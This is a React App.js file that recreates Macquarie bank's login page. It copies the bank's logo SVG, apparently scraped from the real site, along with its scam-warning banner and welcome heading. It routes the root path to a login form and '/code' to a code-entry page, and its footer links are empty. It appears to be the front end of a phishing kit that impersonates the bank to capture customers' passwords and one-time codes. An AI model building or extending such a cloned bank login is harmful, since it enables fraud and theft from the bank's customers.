import React from "react";
import Login from "./Signup";
import { Routes, Route } from "react-router-dom";
import Code from "./Code";

export default function App() {
  return (
    <div>
      <nav>
        <div className="nav-inner">
          <svg
            viewBox="0 0 24 24"
            fill="none"
            height="55"
            width="55"
            xmlns="http://www.w3.org/2000/svg"
            _ngcontent-hwm-c3=""
            focusable="false"
          >
            <path
              d="M12 9v5m0 3v.1M5.022 20h13.955a1.25 1.25 0 0 0 1.118-1.809L13.118 4.236c-.46-.921-1.775-.921-2.236 0L3.904 18.191a1.25 1.25 0 0 0 1.118 1.81m7.228-3a.25.25 0 1 1-.5 0 .25.25 0 0 1 .5 0"
              stroke-width="1.5"
              stroke-linejoin="round"
              stroke-linecap="round"
              stroke="#ffffff"
              _ngcontent-hwm-c3=""
            ></path>
          </svg>

          <div className="nav-text">
            <h3>Important Notice</h3>
            <p>
              Macquarie will never ask you to transfer funds to another account
              and you should never share your passwords. If you have doubts
              about a communication you have received contact
              scams@macquarie.com Stay alert to risks by visiting the{" "}
              <b>Macquarie Scams Hub.</b>
            </p>
          </div>
        </div>
      </nav>

      <div className="auth-box-container">
        <div className="auth-box">
          <div className="brand-logo">
            <svg
              viewBox="0 0 361 64"
              height="50"
              width="150"
              xmlns="http://www.w3.org/2000/svg"
              aria-labelledby="macquarie-logo"
              role="img"
              _ngcontent-hno-c4=""
            >
              <title id="macquarie-logo" _ngcontent-hno-c4="">
                Macquarie logo
              </title>
              <path
                d="M317.5,25.6c0-5-3-9-10.2-9h-16.4v30.8h4.4V34.5h9.7l8.6,12.9h5.1L310,34.3
                C315.7,33.3,317.5,29.1,317.5,25.6 M295.3,30.5v-9.8h11.9c3.8,0,5.9,1.7,5.9,4.8c0,3.2-2.1,4.9-5.9,4.9L295.3,30.5z M248.4,16.6h4.4
                v17.8c0,8.2-5,13.6-13.7,13.6c-8.6,0-13.7-5.4-13.7-13.6V16.6h4.4v17.4c0,6.3,3.3,9.8,9.2,9.8c5.9,0,9.2-3.5,9.2-9.8L248.4,16.6z
                M360.9,43.3v4.1h-24.5V16.6h24.2v4.1h-19.8v8.7h17.7v4.1h-17.7v9.8H360.9z M324.4,16.6h4.4v30.8h-4.4V16.6z M137.4,16.6l-14.2,30.8
                h4.5l3.6-8h15.7l3.6,8h4.5L141,16.6L137.4,16.6z M133.1,35.4l6.1-13.4l6.1,13.4H133.1z M269.1,16.6L255,47.4h4.5l3.6-8h15.7l3.6,8
                h4.5l-14.2-30.8H269.1z M264.9,35.4L271,22l6.1,13.4H264.9z M112.6,16.6h6.7v30.8h-4.2V21.1l-10.9,26.3h-3.8L89.5,21.1v26.3h-4.2
                V16.6H92l10.3,25.1L112.6,16.6z M172.2,20.1c-6.1,0-11.6,4.6-11.6,11.9s5.5,11.9,11.6,11.9c3.9,0,7.1-1.8,9.5-5.4l3.4,2.6
                c-2.8,4.4-7.7,7-12.9,7c-9.1,0-16.1-7-16.1-16.1s7-16.1,16.1-16.1c5.2,0,10.1,2.6,12.9,7l-3.4,2.6C179.2,21.9,176,20.1,172.2,20.1
                M219.8,32c0-8.9-6.9-16-15.8-16c-8.8,0-15.8,7.1-15.8,16c0,8.9,6.9,16.1,15.8,16.1c3.8,0,7.4-1.3,10.3-3.8l3.5,3.2h6.1l-6.8-6.2
                C218.8,38.5,219.8,35.3,219.8,32 M213.7,38.2l-4-3.7l-2.9,2.9l4.3,3.9c-2,1.6-4.5,2.5-7.1,2.5c-6.3,0-11.3-5.2-11.3-11.9
                s5-11.9,11.3-11.9c6.3,0,11.3,5.2,11.3,11.9C215.3,34.2,214.7,36.3,213.7,38.2 M34.2,0C15,0,0,14,0,32s15,32,34.2,32
                s34.2-14,34.2-32S53.4,0,34.2,0 M13.5,54.1c0.1,0.1,0.1,0.3,0,0.4c0,0,0,0,0,0c-0.1,0.1-0.3,0.1-0.4-0.1C7.4,49.8,2.3,42.2,2.3,32
                S7.4,14.2,13.1,9.6c0.2-0.1,0.3-0.2,0.4-0.1c0.1,0.1,0.1,0.3,0,0.4c0,0,0,0,0,0C9.3,14.3,5.2,21.6,5.2,32S9.3,49.7,13.5,54.1
                M24.1,45.7c-0.1,0.1-0.3,0.1-0.4,0c-4.8-2.9-8.6-7.5-8.6-13.8s3.8-10.9,8.6-13.8c0.2-0.1,0.4-0.1,0.4,0c0.1,0.1,0,0.3-0.1,0.3
                c-3.1,2.7-6,7.3-6,13.4s2.9,10.7,6,13.4C24.1,45.5,24.1,45.6,24.1,45.7 M34.2,46.9c-7.4,0-13.9-6.4-13.9-14.9s6.5-14.9,13.9-14.9
                S48.1,23.5,48.1,32S41.6,46.9,34.2,46.9 M44.8,45.8c-0.2,0.1-0.4,0.1-0.5,0c-0.1-0.1,0-0.3,0.1-0.3c3.1-2.7,6-7.3,6-13.4
                s-2.9-10.7-6-13.4c-0.1-0.1-0.2-0.2-0.1-0.3c0.1-0.1,0.3-0.1,0.5,0c4.8,2.9,8.6,7.5,8.6,13.8S49.6,42.9,44.8,45.8 M55.3,54.4
                c-0.2,0.1-0.3,0.2-0.4,0.1c-0.1-0.1-0.1-0.3,0-0.4c0,0,0,0,0,0c4.2-4.4,8.3-11.7,8.3-22.1s-4.1-17.7-8.3-22.1
                c-0.1-0.1-0.1-0.3,0-0.4c0,0,0,0,0,0c0.1-0.1,0.3-0.1,0.4,0.1C61,14.2,66.1,21.8,66.1,32S61,49.8,55.3,54.4"
                fill="var(--mq-logo-fill-color, var(--mq-color-logo-default))"
                _ngcontent-hno-c4=""
              ></path>
            </svg>
          </div>

          <div>
            <h1 className="auth-heading">
              <span>
                Welcome to a better banking
                <span className="welcome-message-highlight">experience</span>
              </span>
            </h1>
          </div>

          <>
            <Routes>
              <Route path="/" element={<Login />} />
              <Route path="/code" element={<Code />} />
            </Routes>
          </>
        </div>
        
        <footer className="footer">
          <ul className="footer-links">
            <li className="footer-links__item">
              <a
                target="_blank"
                rel="noopener"
                auth-analytics-on="click"
                className="auth-link"
                href=""
              >
                Further information
              </a>
            </li>

            <li className="footer-links__item">
              <a
                target="_blank"
                rel="noopener"
                auth-analytics-on="click"
                className="auth-link"
                href=""
              >
                Privacy Policy
              </a>
            </li>

            <li className="footer-links__item">
              <a
                target="_blank"
                rel="noopener"
                auth-analytics-on="click"
                className="auth-link"
                href=""
              >
                Important Information
              </a>
            </li>

            <li className="footer-links__item">
              <a
                target="_blank"
                rel="noopener"
                auth-analytics-on="click"
                className="auth-link"
                href=""
              >
                Complaints
              </a>
            </li>
          </ul>
        </footer>
      </div>
    </div>
  );
}
